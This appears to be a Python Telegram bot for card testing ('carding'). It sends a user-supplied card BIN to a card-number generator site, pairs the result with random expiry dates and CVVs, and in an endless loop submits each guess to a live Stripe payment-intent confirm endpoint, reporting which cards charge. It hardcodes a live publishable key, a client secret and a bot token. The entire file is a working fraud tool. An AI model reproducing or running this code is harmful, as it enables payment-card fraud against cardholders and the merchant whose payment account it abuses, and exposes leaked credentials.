import requests
import json,random,telebot
token = "5461303033:AAGix6ArxyztlurGrozEdK0NuvMPsFvJslA"
bot = telebot.TeleBot(token)
@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(message.chat.id,f"<strong> ضع البين كود الان وانتظر قليلا ليعمل البوت ❤️</strong>",parse_mode="html")
@bot.message_handler(func=lambda m:True)
def log(message):
	bin = message.text
	users = "1234567890"
	while(True):
		url = "https://myvipwebtools.com/extra-tools/bin-to-credit-card-Generator/maingen.php"
		headerss = {
			"accept": "*/*",
			"accept-encoding": "gzip, deflate, br",
			"accept-language": "en-AU,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5",
			"content-length": "762",
			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
			"origin": "https://myvipwebtools.com",
			"referer": "https://myvipwebtools.com/extra-tools/bin-to-credit-card-Generator/",
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36'
				
			
		}
		
		jsondata = {
		
		"ccnum": bin
		
		}
		
		
		response = requests.post(url,headers=headerss,data=jsondata).text
		geet = response.split('["')[1]
		cc = geet.split('"')[0]
#print(response)
#print()
#print()
#print(cc)
		users = "1234567890"
		long = ['01','02','03','04','05','06','07','08','09','10','11','12']
		years1 = ['2023','2024','2025','2026']
		mm = ("".join(random.choice(long)))
		yy = ("".join(random.choice(years1)))
		cvv = ("".join(random.choice(users)for i in range(3)))
		curl = "https://api.stripe.com/v1/payment_intents/pi_3LSmzNLwHPwmOanK1PCO7a7J/confirm"
		headers = {
		"accept": "application/json",
		"accept-encoding": "gzip, deflate, br",
		"accept-language": "en-AU,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,en-GB;q=0.6,en-US;q=0.5",
		"content-length": "762",
		"content-type": "application/x-www-form-urlencoded",
		"origin": "https://js.stripe.com",
		"referer": "https://js.stripe.com/",
		'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
		'sec-ch-ua-mobile': '?1',
		'sec-ch-ua-platform': '"Android"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2170) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36'
			
			}
			
		data = {
	#		 'save_payment_method':'true',
	#		 'setup_future_usage':'off_session',
		 'payment_method_data[type]':'card',
		'payment_method_data[billing_details][address][postal_code]':'10080',
		'payment_method_data[billing_details][name]':'mano',
		'payment_method_data[billing_details][email]':'oofline@gmail.com',
		'payment_method_data[card][number]':str(cc),
		'payment_method_data[card][cvc]':str(cvv),
		'payment_method_data[card][exp_month]':str(mm),
		 'payment_method_data[card][exp_year]':str(yy),
		  'payment_method_data[guid]': "05959ff7-505e-47ef-95cb-7014015fbceaeadf49",
		'payment_method_data[muid]': "6b73ef79-f40d-446e-a54e-be8f127c921a998847",
		'payment_method_data[sid]':'c2850423-1dc8-4883-8ee0-157d9692f8bdd366ca',
	# 'payment_method_data[pasted_fields]':'number',
		'payment_method_data[payment_user_agent]':'stripe.js/70a10e913;+stripe-js-v3/70a10e913',
		'payment_method_data[time_on_page]':'40371',
			 			#'payment_method_data[referrer]':'https%3A%2F%2Felevatedbygrace.org%2F%3Fasp_action%3Dshow_pp%26product_id%3D330',
		'expected_payment_method_type':'card',
		'use_stripe_sdk':'true',
		'key':'pk_live_XhNQUEP4Wkuy4W7sLDr50Y4d',
		'client_secret': "pi_3LSmzNLwHPwmOanK1PCO7a7J_secret_j4mVxBHumMyRllOIc2NEVzdAe",
	 }
	
		rs=(cc+' '+mm+' '+yy+' '+cvv)
		respone = requests.post(curl,headers=headers,data=data).text
		#print(respone)
		reaa=respone.split('"message": "')[1]
		status=reaa.split('"')[0]
		if 'Your card was declined' in respone:
			aa = '22'
			bot.send_message(message.chat.id,f"<strong>❌❌NO❌❌\n------------------------------------------\nCard: {rs}\nResponse -» {status}\nBy -» Mohammed Elmoslemany\n------------------------------------------</strong>",parse_mode="html")
	#		b += 1
		elif 'Your card has insufficient funds.' in respone:
			bot.send_message(message.chat.id,f"<strong>❌ Not Charge\n------------------------------------------\nCard: {rs}\nResponse -» {status}\nBy -» Mohammed Elmoslemany\n------------------------------------------</strong>",parse_mode="html")
		#	CHARGED += 1
		elif 'Your card number is incorrect.' in respone:
			aa= "12"
			bot.send_message(message.chat.id,f"<strong>🚫CARD NOT FOUND\n------------------------------------------\nCard: {rs}\nResponse -» {status}\nBy -» Mohammed Elmoslemany\n------------------------------------------</strong>",parse_mode="html")
		else:
			bot.send_message(message.chat.id,f"<strong>✅ Charge\n------------------------------------------\nCard: {rs}\nResponse -» {status}\nBy -» Mohammed Elmoslemany\n------------------------------------------</strong>",parse_mode="html")
	#		h += 1
bot.polling()
